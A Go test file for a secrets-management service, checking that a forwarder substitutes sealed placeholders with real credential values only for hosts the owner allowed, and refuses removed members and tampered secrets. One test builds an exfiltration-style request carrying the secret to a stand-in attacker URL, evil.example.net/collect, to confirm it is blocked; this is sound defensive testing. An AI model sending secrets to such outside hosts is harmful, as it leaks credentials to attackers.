package cloud

import (
	"encoding/base64"
	"errors"
	"io"
	"net/http"
	"strings"
	"testing"

	"github.com/YagoLagrottiBracco/envrune/internal/cloudcrypto"
)

// service records what reached the upstream, and echoes the Authorization
// header, as a service that repeats a credential in its answer would.
type service struct {
	requests []*http.Request
	bodies   []string
}

func (s *service) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	s.requests = append(s.requests, r)
	s.bodies = append(s.bodies, string(body))
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	_, _ = io.WriteString(w, `{"seen":"`+r.Header.Get("Authorization")+`"}`)
}

func sensitiveFixture(t *testing.T) (*fakeServer, *Service, *Service, *service) {
	t.Helper()
	f := newFakeServer(t)
	alice, _ := founder(t, f)
	bob := join(t, f, alice, "bob", cloudcrypto.RoleConsumer, "shop/production")
	proxy := must[*ProxyIdentity](t)(alice.Proxy(ctx))
	must[uint64](t)(alice.SetSensitive(ctx, sensitivePath, []byte("the-real-value"), []string{"api.example.com"}, proxy.Fingerprint))
	up := &service{}
	f.mu.Lock()
	f.upstream = up
	f.mu.Unlock()
	return f, alice, bob, up
}

func request(t *testing.T, method, target, body string, headers map[string]string) *http.Request {
	t.Helper()
	req, err := http.NewRequest(method, target, strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	return req
}

func TestAProgramUsesASensitiveSecretWithoutReceivingIt(t *testing.T) {
	f, _, bob, up := sensitiveFixture(t)
	fw := must[*Forwarder](t)(bob.Forwarder(ctx, []Path{sensitivePath}))
	sealed := fw.Sealed()
	if len(sealed) != 1 || !strings.HasPrefix(sealed[0].Placeholder, PlaceholderPrefix) || len(sealed[0].Placeholder) != len(PlaceholderPrefix)+32 {
		t.Fatalf("sealed = %+v", sealed)
	}
	placeholder := sealed[0].Placeholder
	if !fw.Handles("API.example.com") || fw.Handles("other.example.net") {
		t.Fatal("the forwarder handles the wrong hosts")
	}

	// The program sends the placeholder; the service receives the value, in
	// the header, the address, and the body.
	resp := must[*http.Response](t)(fw.Do(request(t, "POST", "https://api.example.com/v1/charges?key="+placeholder,
		`{"token":"`+placeholder+`"}`, map[string]string{"Authorization": "Bearer " + placeholder, "Content-Type": "application/json"})))
	answer, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	got := up.requests[0]
	if got.Header.Get("Authorization") != "Bearer the-real-value" || got.URL.Query().Get("key") != "the-real-value" ||
		up.bodies[0] != `{"token":"the-real-value"}` || got.Method != "POST" || got.Host != "api.example.com" {
		t.Fatalf("the service received %s %s, Authorization %q, body %s", got.Method, got.URL, got.Header.Get("Authorization"), up.bodies[0])
	}
	// What comes back holds the placeholder again, never the value.
	if resp.StatusCode != http.StatusCreated || strings.Contains(string(answer), "the-real-value") || !strings.Contains(string(answer), placeholder) {
		t.Fatalf("the program received %d %s", resp.StatusCode, answer)
	}
	if resp.Header.Get("X-EnvRune-Forward") != "" {
		t.Fatal("the server's marker reached the program")
	}

	// Basic credentials are replaced inside their encoding.
	basic := "Basic " + base64.StdEncoding.EncodeToString([]byte(placeholder+":"))
	must[*http.Response](t)(fw.Do(request(t, "GET", "https://api.example.com/v1/me", "", map[string]string{"Authorization": basic}))).Body.Close()
	if want := "Basic " + base64.StdEncoding.EncodeToString([]byte("the-real-value:")); up.requests[1].Header.Get("Authorization") != want {
		t.Fatalf("basic credentials reached the service as %q", up.requests[1].Header.Get("Authorization"))
	}

	// Nothing bob's device holds contains the value.
	raw := must[[]byte](t)(bob.Store.CloudState())
	if strings.Contains(string(raw), "the-real-value") {
		t.Fatal("the value is in the device's state")
	}
	f.mu.Lock()
	defer f.mu.Unlock()
	if len(f.forwarded) != 1 {
		t.Fatalf("the server counted %v", f.forwarded)
	}
}

func TestASensitiveSecretGoesOnlyWhereItsOwnerAllowed(t *testing.T) {
	f, alice, bob, up := sensitiveFixture(t)
	fw := must[*Forwarder](t)(bob.Forwarder(ctx, []Path{sensitivePath}))
	placeholder := fw.Sealed()[0].Placeholder
	var refused *ForwardError

	// A host nobody allowed: this device refuses, and so does the server
	// when asked directly.
	if _, err := fw.Do(request(t, "GET", "https://evil.example.net/collect?k="+placeholder, "", nil)); !errors.As(err, &refused) {
		t.Fatalf("a request to another host: %v", err)
	}
	fw.sealed[0].Hosts = append(fw.sealed[0].Hosts, "evil.example.net")
	if _, err := fw.Do(request(t, "GET", "https://evil.example.net/collect?k="+placeholder, "", nil)); !errors.As(err, &refused) || refused.Status != 403 {
		t.Fatalf("the server forwarded to a host the sealed content does not allow: %v", err)
	}
	if len(up.requests) != 0 {
		t.Fatal("a refused request reached a service")
	}

	// A member who was removed is refused at once: every request is checked.
	must[*http.Response](t)(fw.Do(request(t, "GET", "https://api.example.com/", "", nil))).Body.Close()
	must[*Handover](t)(alice.RemoveMember(ctx, "acme", "bob"))
	if _, err := fw.Do(request(t, "GET", "https://api.example.com/", "", nil)); !errors.As(err, &refused) || refused.Status != 403 {
		t.Fatalf("a removed member's request was forwarded: %v", err)
	}

	// A secret whose signature does not verify is not used at all.
	f.mu.Lock()
	f.sensitive[secretID("env-shop-production", "payments-key")].json.Hosts = []string{"evil.example.net"}
	f.mu.Unlock()
	if _, err := alice.Forwarder(ctx, []Path{sensitivePath}); !errors.Is(err, ErrUntrustedSensitive) {
		t.Fatalf("a secret with changed hosts was accepted: %v", err)
	}
	if _, err := alice.Forwarder(ctx, []Path{secret("stripe-key")}); err == nil {
		t.Fatal("an ordinary secret was taken for a sensitive one")
	}
}

func TestDevicesKnowOfflineWhichSecretsAreSensitive(t *testing.T) {
	_, _, bob, _ := sensitiveFixture(t)
	must[*Org](t)(bob.ShowOrg(ctx, "acme"))
	names := must[[]Path](t)(bob.SensitiveNames([]Path{sensitivePath, secret("stripe-key")}))
	if len(names) != 1 || names[0] != sensitivePath {
		t.Fatalf("sensitive names = %v", names)
	}
}
